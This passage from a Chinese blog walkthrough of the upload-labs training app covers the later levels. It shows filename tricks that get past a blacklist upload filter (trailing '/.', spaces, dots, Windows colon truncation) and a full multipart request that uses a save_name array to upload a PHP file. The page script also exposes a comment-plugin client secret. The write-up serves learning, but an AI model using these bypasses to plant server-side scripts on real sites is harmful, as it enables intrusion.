<p>move_uploaded_file（A,B）函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；<code>否则将会返回false，并且不执行任何操作</code>。</p>
<p>由于这里利用了黑名单，则move_uploaded_file（）函数在判断时只会判断是否为黑名单，如果不是，那么他将会直接将文件保存在指定目录下。所以在这里我们利用 <code>/.</code>(斜杠点)和 <code>空格</code>（空格）进行绕过。</p>
<p>（1） “/.”(斜杠点)</p>
<p>​    <code>upload-19.php/.</code></p>
<p>（2）“ ”（空格）</p>
<p>​    <code>upload-19.php </code></p>
<p>​</p>
<p>（3）“ .”（空格）</p>
<p><code>upload-19.php.</code></p>
<p><code>upload-19.php. </code>   点+空格</p>
<p>等等&hellip;</p>
<p><strong>方法三：</strong></p>
<p>Windows冒号截断</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">upload-19.php:.jpg
</span></span></code></pre></td></tr></table>
</div>
</div><p>(我做的实验，php上传成功，但是内容清空了)</p>
<h2 id="pass---21">Pass - 21</h2>
<blockquote>
<p>参考: <a href="https://blog.csdn.net/kekefen01/article/details/90346413"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/kekefen01/article/details/90346413<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<p>通过传递数组绕过。属于逻辑漏洞，没有考虑数组第二个元素不存在的情况。</p>
<h6 id="绕过-20">绕过</h6>
<p>使用多个数组</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">------WebKitFormBoundaryDTdqZdRoon2GpWOE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;upload_file&#34;; filename=&#34;info.php&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Type: image/jpeg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php phpinfo();?&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryDTdqZdRoon2GpWOE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;save_name[0]&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">info.php/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryDTdqZdRoon2GpWOE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;save_name[2]&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">jpg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryDTdqZdRoon2GpWOE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;submit&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">上传
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryDTdqZdRoon2GpWOE--
</span></span></code></pre></td></tr></table>
</div>
</div><p>最终文件名为“info.php/.” 因为move_uploaded_file底层会调用tsrm_realpath函数导致，递归删除文件名最后的/.</p>
<blockquote>
<p>参考文章：https://blog.csdn.net/weixin_43901038/article/details/94890631</p>
</blockquote>
<blockquote>
<p><a href="https://www.cnblogs.com/shellr00t/p/6426945.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/shellr00t/p/6426945.html<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<blockquote>
<p><a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/"target="_blank" rel="external nofollow noopener noreferrer">https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title=2023-03-23&#32;07:30:09>更新于 2023-03-23&nbsp;</span>
      </div><div class="post-info-license">
          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
        </div></div>
    <div class="post-info-line">
      <div class="post-info-md"><span><a href="/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
      <div class="post-info-share">
        <span></span>
      </div>
    </div>
  </div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/' class="post-tag">渗透测试</a><a href='/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/' class="post-tag">文件上传</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/python%E4%B9%8Brequests%E5%BA%93/" class="post-nav-item" rel="prev" title="python之requests库"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>python之requests库</a>
      <a href="/wpscan%E6%9B%B4%E6%96%B0%E8%B6%85%E6%97%B6%E6%8A%A5%E9%94%99/" class="post-nav-item" rel="next" title="wpscan更新超时报错">wpscan更新超时报错<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="gitalk" class="comment"></div><noscript>
        Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk" rel="external nofollow noopener noreferrer">Gitalk</a>.
      </noscript></div></article></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.111.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
              <a href="http://shuai06.github.io"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/gitalk/gitalk.min.js"></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"gitalk":{"admin":["shuai06"],"clientID":"d75ec1a5864747376f6f","clientSecret":"1b354dc131534bb3b7511213c74d3f9116a03a79","id":"2020-02-17T18:08:02+08:00","owner":"shuai06","repo":"hexo-gitalk","title":"upload-labs通关记录"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
</html>
